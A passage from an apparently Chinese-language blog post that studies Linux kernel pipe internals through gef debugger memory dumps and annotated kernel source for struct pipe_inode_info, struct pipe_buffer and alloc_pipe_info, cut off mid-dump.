0x7,</span></span><br><span class="line"><span class="comment">  i_rwsem = &#123;</span></span><br><span class="line"><span class="comment">    count = &#123;</span></span><br><span class="line"><span class="comment">      counter = 0x0</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    owner = &#123;</span></span><br><span class="line"><span class="comment">      counter = 0x0</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    osq = &#123;</span></span><br><span class="line"><span class="comment">      tail = &#123;</span></span><br><span class="line"><span class="comment">        counter = 0x0</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    wait_lock = &#123;</span></span><br><span class="line"><span class="comment">      raw_lock = &#123;</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">          val = &#123;</span></span><br><span class="line"><span class="comment">            counter = 0x0</span></span><br><span class="line"><span class="comment">          &#125;,</span></span><br><span class="line"><span class="comment">          &#123;</span></span><br><span class="line"><span class="comment">            locked = 0x0,</span></span><br><span class="line"><span class="comment">            pending = 0x0</span></span><br><span class="line"><span class="comment">          &#125;,</span></span><br><span class="line"><span class="comment">          &#123;</span></span><br><span class="line"><span class="comment">            locked_pending = 0x0,</span></span><br><span class="line"><span class="comment">            tail = 0x0</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    wait_list = &#123;</span></span><br><span class="line"><span class="comment">      next = 0xffff888005315078,</span></span><br><span class="line"><span class="comment">      prev = 0xffff888005315078</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  dirtied_when = 0x0,</span></span><br><span class="line"><span class="comment">  dirtied_time_when = 0x0,</span></span><br><span class="line"><span class="comment">  i_hash = &#123;</span></span><br><span class="line"><span class="comment">    next = 0xffff8880052ce9d8,</span></span><br><span class="line"><span class="comment">    pprev = 0x0 &lt;fixed_percpu_data&gt;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_io_list = &#123;</span></span><br><span class="line"><span class="comment">    next = 0xffff8880053150a8,</span></span><br><span class="line"><span class="comment">    prev = 0xffff8880053150a8</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_lru = &#123;</span></span><br><span class="line"><span class="comment">    next = 0xffff8880053150b8,</span></span><br><span class="line"><span class="comment">    prev = 0xffff8880053150b8</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_sb_list = &#123;</span></span><br><span class="line"><span class="comment">    next = 0xffff8880053150c8,</span></span><br><span class="line"><span class="comment">    prev = 0xffff8880053150c8</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_wb_list = &#123;</span></span><br><span class="line"><span class="comment">    next = 0xffff8880053150d8,</span></span><br><span class="line"><span class="comment">    prev = 0xffff8880053150d8</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  &#123;</span></span><br><span class="line"><span class="comment">    i_dentry = &#123;</span></span><br><span class="line"><span class="comment">      first = 0x0 &lt;fixed_percpu_data&gt;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    i_rcu = &#123;</span></span><br><span class="line"><span class="comment">      next = 0x0 &lt;fixed_percpu_data&gt;,</span></span><br><span class="line"><span class="comment">      func = 0x0 &lt;fixed_percpu_data&gt;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_version = &#123;</span></span><br><span class="line"><span class="comment">    counter = 0x0</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_sequence = &#123;</span></span><br><span class="line"><span class="comment">    counter = 0x0</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_count = &#123;</span></span><br><span class="line"><span class="comment">    counter = 0x1</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_dio_count = &#123;</span></span><br><span class="line"><span class="comment">    counter = 0x0</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_writecount = &#123;</span></span><br><span class="line"><span class="comment">    counter = 0x0</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_readcount = &#123;</span></span><br><span class="line"><span class="comment">    counter = 0x0</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  &#123;</span></span><br><span class="line"><span class="comment">    i_fop = 0xffffffff82019e20 &lt;pipefifo_fops&gt;,</span></span><br><span class="line"><span class="comment">    free_inode = 0xffffffff82019e20 &lt;pipefifo_fops&gt;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_flctx = 0x0 &lt;fixed_percpu_data&gt;,</span></span><br><span class="line"><span class="comment">  i_data = &#123;</span></span><br><span class="line"><span class="comment">    host = 0xffff888005314fc0,</span></span><br><span class="line"><span class="comment">    i_pages = &#123;</span></span><br><span class="line"><span class="comment">      xa_lock = &#123;</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">          rlock = &#123;</span></span><br><span class="line"><span class="comment">            raw_lock = &#123;</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                val = &#123;</span></span><br><span class="line"><span class="comment">                  counter = 0x0</span></span><br><span class="line"><span class="comment">                &#125;,</span></span><br><span class="line"><span class="comment">                &#123;</span></span><br><span class="line"><span class="comment">                  locked = 0x0,</span></span><br><span class="line"><span class="comment">                  pending = 0x0</span></span><br><span class="line"><span class="comment">                &#125;,</span></span><br><span class="line"><span class="comment">                &#123;</span></span><br><span class="line"><span class="comment">                  locked_pending = 0x0,</span></span><br><span class="line"><span class="comment">                  tail = 0x0</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      &#125;,</span></span><br><span class="line"><span class="comment">      xa_flags = 0x21,</span></span><br><span class="line"><span class="comment">      xa_head = 0x0 &lt;fixed_percpu_data&gt;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    gfp_mask = 0x100cca,</span></span><br><span class="line"><span class="comment">    i_mmap_writable = &#123;</span></span><br><span class="line"><span class="comment">      counter = 0x0</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    i_mmap = &#123;</span></span><br><span class="line"><span class="comment">      rb_root = &#123;</span></span><br><span class="line"><span class="comment">        rb_node = 0x0 &lt;fixed_percpu_data&gt;</span></span><br><span class="line"><span class="comment">      &#125;,</span></span><br><span class="line"><span class="comment">      rb_leftmost = 0x0 &lt;fixed_percpu_data&gt;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    i_mmap_rwsem = &#123;</span></span><br><span class="line"><span class="comment">      count = &#123;</span></span><br><span class="line"><span class="comment">        counter = 0x0</span></span><br><span class="line"><span class="comment">      &#125;,</span></span><br><span class="line"><span class="comment">      owner = &#123;</span></span><br><span class="line"><span class="comment">        counter = 0x0</span></span><br><span class="line"><span class="comment">      &#125;,</span></span><br><span class="line"><span class="comment">      osq = &#123;</span></span><br><span class="line"><span class="comment">        tail = &#123;</span></span><br><span class="line"><span class="comment">          counter = 0x0</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      &#125;,</span></span><br><span class="line"><span class="comment">      wait_lock = &#123;</span></span><br><span class="line"><span class="comment">        raw_lock = &#123;</span></span><br><span class="line"><span class="comment">          &#123;</span></span><br><span class="line"><span class="comment">            val = &#123;</span></span><br><span class="line"><span class="comment">              counter = 0x0</span></span><br><span class="line"><span class="comment">            &#125;,</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">              locked = 0x0,</span></span><br><span class="line"><span class="comment">              pending = 0x0</span></span><br><span class="line"><span class="comment">            &#125;,</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">              locked_pending = 0x0,</span></span><br><span class="line"><span class="comment">              tail = 0x0</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      &#125;,</span></span><br><span class="line"><span class="comment">      wait_list = &#123;</span></span><br><span class="line"><span class="comment">        next = 0xffff888005315170,</span></span><br><span class="line"><span class="comment">        prev = 0xffff888005315170</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    nrpages = 0x0,</span></span><br><span class="line"><span class="comment">    nrexceptional = 0x0,</span></span><br><span class="line"><span class="comment">    writeback_index = 0x0,</span></span><br><span class="line"><span class="comment">    a_ops = 0xffffffff8201a340 &lt;empty_aops&gt;,</span></span><br><span class="line"><span class="comment">    flags = 0x0,</span></span><br><span class="line"><span class="comment">    wb_err = 0x0,</span></span><br><span class="line"><span class="comment">    private_lock = &#123;</span></span><br><span class="line"><span class="comment">      &#123;</span></span><br><span class="line"><span class="comment">        rlock = &#123;</span></span><br><span class="line"><span class="comment">          raw_lock = &#123;</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">              val = &#123;</span></span><br><span class="line"><span class="comment">                counter = 0x0</span></span><br><span class="line"><span class="comment">              &#125;,</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                locked = 0x0,</span></span><br><span class="line"><span class="comment">                pending = 0x0</span></span><br><span class="line"><span class="comment">              &#125;,</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                locked_pending = 0x0,</span></span><br><span class="line"><span class="comment">                tail = 0x0</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    private_list = &#123;</span></span><br><span class="line"><span class="comment">      next = 0xffff8880053151b0,</span></span><br><span class="line"><span class="comment">      prev = 0xffff8880053151b0</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    private_data = 0x0 &lt;fixed_percpu_data&gt;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_devices = &#123;</span></span><br><span class="line"><span class="comment">    next = 0xffff8880053151c8,</span></span><br><span class="line"><span class="comment">    prev = 0xffff8880053151c8</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  &#123;</span></span><br><span class="line"><span class="comment">    i_pipe = 0xffff888004f72e40,</span></span><br><span class="line"><span class="comment">    i_cdev = 0xffff888004f72e40,</span></span><br><span class="line"><span class="comment">    i_link = 0xffff888004f72e40 &quot;&quot;,</span></span><br><span class="line"><span class="comment">    i_dir_seq = 0x4f72e40</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_generation = 0x0,</span></span><br><span class="line"><span class="comment">  i_fsnotify_mask = 0x0,</span></span><br><span class="line"><span class="comment">  i_fsnotify_marks = 0x0 &lt;fixed_percpu_data&gt;,</span></span><br><span class="line"><span class="comment">  i_private = 0x0 &lt;fixed_percpu_data&gt;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



<h4 id="6、struct-pipe-inode-info"><a href="#6、struct-pipe-inode-info" class="headerlink" title="6、struct pipe_inode_info"></a>6、struct pipe_inode_info</h4><p>这里为上面<code>alloc_pipe_info</code>所分配的数据结构，也就是管道的数据结构。里面的成员信息我用中文进行了注释。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	struct pipe_inode_info - a linux kernel pipe</span></span><br><span class="line"><span class="comment"> *	@mutex: mutex protecting the whole thing</span></span><br><span class="line"><span class="comment"> *	@rd_wait: reader wait point in case of empty pipe</span></span><br><span class="line"><span class="comment"> *	@wr_wait: writer wait point in case of full pipe</span></span><br><span class="line"><span class="comment"> *	@head: The point of buffer production</span></span><br><span class="line"><span class="comment"> *	@tail: The point of buffer consumption</span></span><br><span class="line"><span class="comment"> *	@note_loss: The next read() should insert a data-lost message</span></span><br><span class="line"><span class="comment"> *	@max_usage: The maximum number of slots that may be used in the ring</span></span><br><span class="line"><span class="comment"> *	@ring_size: total number of buffers (should be a power of 2)</span></span><br><span class="line"><span class="comment"> *	@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span></span><br><span class="line"><span class="comment"> *	@tmp_page: cached released page</span></span><br><span class="line"><span class="comment"> *	@readers: number of current readers of this pipe</span></span><br><span class="line"><span class="comment"> *	@writers: number of current writers of this pipe</span></span><br><span class="line"><span class="comment"> *	@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class="line"><span class="comment"> *	@r_counter: reader counter</span></span><br><span class="line"><span class="comment"> *	@w_counter: writer counter</span></span><br><span class="line"><span class="comment"> *	@fasync_readers: reader side fasync</span></span><br><span class="line"><span class="comment"> *	@fasync_writers: writer side fasync</span></span><br><span class="line"><span class="comment"> *	@bufs: the circular array of pipe buffers</span></span><br><span class="line"><span class="comment"> *	@user: the user who created this pipe</span></span><br><span class="line"><span class="comment"> *	@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span>						<span class="comment">// 互斥锁</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> rd_wait, wr_wait;			<span class="comment">// 管道为空与管道已满时的指针</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> head;						<span class="comment">// 管道头</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> tail;							<span class="comment">// 管道尾</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_usage;				<span class="comment">// </span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ring_size;					<span class="comment">// 缓冲区大小（应该是2的幂）</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">bool</span> note_loss;							<span class="comment">// 下一个 read() 应该插入一条数据丢失消息</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> nr_accounted;			<span class="comment">// 该管道在 user-&gt;pipe_bufs 中所占的数量</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> readers;					<span class="comment">// 当前读管道的线程数量</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> writers;					 <span class="comment">// 当前写管道的线程数量</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> files;						  <span class="comment">// 引用此管道的结构体数两（受 -&gt;i_lock 保护）</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> r_counter;					<span class="comment">// 读者计数器</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> w_counter;					<span class="comment">// 写者计数器</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span>									<span class="comment">// 缓存页</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span>				<span class="comment">// 读者端 fasync</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span>				<span class="comment">// 写者端 fasync</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span>								 <span class="comment">// 管道缓冲区的循环数组</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>									<span class="comment">// 创建此管道的用户</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span>				<span class="comment">// 如果这个管道是一个 watch_queue，则该结构体存储该结构</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="7、struct-pipe-buffer"><a href="#7、struct-pipe-buffer" class="headerlink" title="7、struct pipe_buffer"></a>7、struct pipe_buffer</h4><p>pipe中的数据保存在结构体 <code>pipe_buffer</code>中。同样，里面的成员信息我用中文进行了注释。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *	@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *	@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *	@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *	@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *	@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *	@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span>											<span class="comment">// 	包含管道缓冲区数据的页					</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;									<span class="comment">// 页内数据的长度</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span>			<span class="comment">// 与该缓冲区关联的操作</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;											<span class="comment">// 管道缓冲区flag</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;									<span class="comment">// 私有数据</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="8、alloc-pipe-info"><a href="#8、alloc-pipe-info" class="headerlink" title="8、alloc_pipe_info"></a>8、alloc_pipe_info</h4><p>该函数被<code>get_pipe_inode</code>调用，用于生成一个<code>pipe_inode_info</code>对象。</p>
<p>该函数的大体逻辑为：首先通过<code>kzalloc</code>为<code>pipe_inode_info</code>对象分配堆空间，之后对边界情况做了一些异常处理，之后通过 <code>kcalloc</code> 给<code>pipe_inode_info-&gt;bufs</code>分配堆内存，如果分配成功，则对<code>pipe_inode_info</code>的其他成员变量进行初始化。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct pipe_inode_info *<span class="title">alloc_pipe_info</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> pipe_bufs = PIPE_DEF_BUFFERS;			<span class="comment">// 0x10</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> <span class="built_in">get_current_user</span>();		<span class="comment">// 这里的user相当于生成的管道的句柄（接口），包括被多少个进程，引用计数，用户有多少挂起的信号，拥有的watches数量等等。</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> user_bufs;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_size = <span class="built_in">READ_ONCE</span>(pipe_max_size);		<span class="comment">// 这里是 max_size为0x100000，pipe_max_size也为0x100000</span></span><br><span class="line"></span><br><span class="line">	pipe = <span class="built_in">kzalloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);			<span class="comment">// 这里通过 kzalloc 为 pipe_inode_info 结构体对象生成一块堆空间</span></span><br><span class="line">	<span class="keyword">if</span> (pipe == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_free_uid;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pipe_bufs * PAGE_SIZE &gt; max_size &amp;&amp; !<span class="built_in">capable</span>(CAP_SYS_RESOURCE))			<span class="comment">// 没进入这个if，# define PAGE_SIZE 4096，而0x10 * 0x1000 &lt; 0x100000</span></span><br><span class="line">		pipe_bufs = max_size &gt;&gt; PAGE_SHIFT;		<span class="comment">// # define PAGE_SHIFT 12</span></span><br><span class="line"></span><br><span class="line">	user_bufs = <span class="built_in">account_pipe_buffers</span>(user, <span class="number">0</span>, pipe_bufs);	<span class="comment">// 0x10</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">too_many_pipe_buffers_soft</span>(user_bufs) &amp;&amp; <span class="built_in">pipe_is_unprivileged_user</span>()) &#123;		<span class="comment">// 没进入该if</span></span><br><span class="line">		user_bufs = <span class="built_in">account_pipe_buffers</span>(user, pipe_bufs, <span class="number">1</span>);</span><br><span class="line">		pipe_bufs = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">too_many_pipe_buffers_hard</span>(user_bufs) &amp;&amp; <span class="built_in">pipe_is_unprivileged_user</span>())				<span class="comment">// 也没有进入该if</span></span><br><span class="line">		<span class="keyword">goto</span> out_revert_acct;</span><br><span class="line"></span><br><span class="line">	pipe-&gt;bufs = <span class="built_in">kcalloc</span>(pipe_bufs, <span class="built_in"><span class="keyword">sizeof</span></span>(struct pipe_buffer),</span><br><span class="line">			     GFP_KERNEL_ACCOUNT);			<span class="comment">// 通过 kcalloc 给pipe_buffer分配堆内存。</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;bufs) &#123;					<span class="comment">// 为pip_inode_info结构体其他变量赋值</span></span><br><span class="line">		<span class="built_in">init_waitqueue_head</span>(&amp;pipe-&gt;rd_wait);</span><br><span class="line">		<span class="built_in">init_waitqueue_head</span>(&amp;pipe-&gt;wr_wait);</span><br><span class="line">		pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">		pipe-&gt;max_usage = pipe_bufs;		<span class="comment">// 0x10</span></span><br><span class="line">		pipe-&gt;ring_size = pipe_bufs;			<span class="comment">// 0x10</span></span><br><span class="line">		pipe-&gt;nr_accounted = pipe_bufs;		<span class="comment">// 0x10</span></span><br><span class="line">		pipe-&gt;user = user;</span><br><span class="line">		<span class="built_in">mutex_init</span>(&amp;pipe-&gt;mutex);</span><br><span class="line">		<span class="keyword">return</span> pipe;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">	(<span class="keyword">void</span>) <span class="built_in">account_pipe_buffers</span>(user, pipe_bufs, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">kfree</span>(pipe);</span><br><span class="line">out_free_uid:</span><br><span class="line">	<span class="built_in">free_uid</span>(user);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">下面是该函数返回值，也就是pipe</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">gef➤  p *pipe</span></span><br><span class="line"><span class="comment">$5 = &#123;</span></span><br><span class="line"><span class="comment">  mutex = &#123;</span></span><br><span class="line"><span class="comment">    owner = &#123;</span></span><br><span class="line"><span class="comment">      counter = 0x0</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    wait_lock 